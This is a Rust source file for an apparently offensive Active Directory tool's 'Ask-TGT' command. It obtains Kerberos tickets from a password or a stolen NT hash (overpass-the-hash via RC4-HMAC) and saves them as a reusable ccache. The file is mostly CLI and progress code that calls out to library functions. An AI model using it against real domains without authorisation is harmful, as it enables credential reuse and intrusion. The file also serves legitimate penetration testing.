//! Ask-TGT: obtain a Kerberos TGT with password or NT hash (overpass-the-hash)
//! and write a reusable MIT ccache for `-k` workflows.

use crate::ui;
use anyhow::Result;
use clap::Parser;

#[derive(Parser)]
pub(crate) struct AsktgtArgs {
    /// Username (sAMAccountName)
    #[arg(long)]
    pub user: String,
    /// Kerberos realm, e.g. CORP.LOCAL
    #[arg(long)]
    pub realm: String,
    /// KDC `host[:port]`
    #[arg(long)]
    pub kdc: String,
    /// Password auth (AES256). Mutually exclusive with --nt-hash.
    #[arg(long)]
    pub password: Option<adhammer_core::SecretString>,
    /// NT hash (32 hex) → overpass-the-hash via RC4-HMAC (legacy / RC4-enabled DCs).
    #[arg(long)]
    pub nt_hash: Option<adhammer_core::SecretString>,
    /// Output ccache path (defaults to `<user>.ccache`)
    #[arg(long)]
    pub out: Option<String>,
}

/// Ask-TGT: obtain a TGT with a password and write a reusable MIT ccache.
///
/// Wraps `asktgt_impl` with a rich per-stage checklist so the run-end card breaks the
/// operation into "resolve credentials → obtain TGT → write ccache" instead of a single
/// opaque "execute action" line. Failure at any stage lands as `mark_current_failed` on
/// that stage, so the operator sees exactly where the pipeline stopped.
pub(crate) async fn asktgt(a: AsktgtArgs) -> Result<()> {
    let mut checklist =
        ui::StageChecklist::new(["resolve credentials", "obtain TGT from KDC", "write ccache"]);
    let result = asktgt_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("Ask-TGT stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("Ask-TGT stages (failed)");
        }
    }
    result
}

async fn asktgt_impl(a: AsktgtArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    let (ccache, auth_mode) = match (&a.nt_hash, &a.password) {
        (Some(h), None) => {
            let nt = crate::parse_nt_hash(h)?;
            checklist.record_ok(
                "resolve credentials",
                "NT hash (overpass-the-hash / RC4-HMAC)",
            );
            let cc = adhammer_kerberos::overpass_the_hash(&a.user, &a.realm, &a.kdc, &nt).await?;
            (cc, "RC4-HMAC")
        }
        (None, Some(pw)) => {
            checklist.record_ok("resolve credentials", "password (AES256)");
            let cc = adhammer_kerberos::asktgt(&a.user, &a.realm, &a.kdc, pw).await?;
            (cc, "AES256")
        }
        _ => anyhow::bail!("provide exactly one of --password or --nt-hash"),
    };
    checklist.record_ok(
        "obtain TGT from KDC",
        format!("{auth_mode} · {} bytes", ccache.len()),
    );
    let out = a.out.unwrap_or_else(|| format!("{}.ccache", a.user));
    adhammer_core::write_secret_artifact(
        std::path::Path::new(&out),
        adhammer_core::SecretArtifact::Ccache,
        &ccache,
    )?;
    checklist.record_ok("write ccache", format!("→ {out}"));
    println!(
        "[+] TGT obtained for {} → {out} ({} bytes)",
        a.user,
        ccache.len()
    );
    println!("    export KRB5CCNAME={out}  (use with Kerberos-aware tooling)");
    Ok(())
}
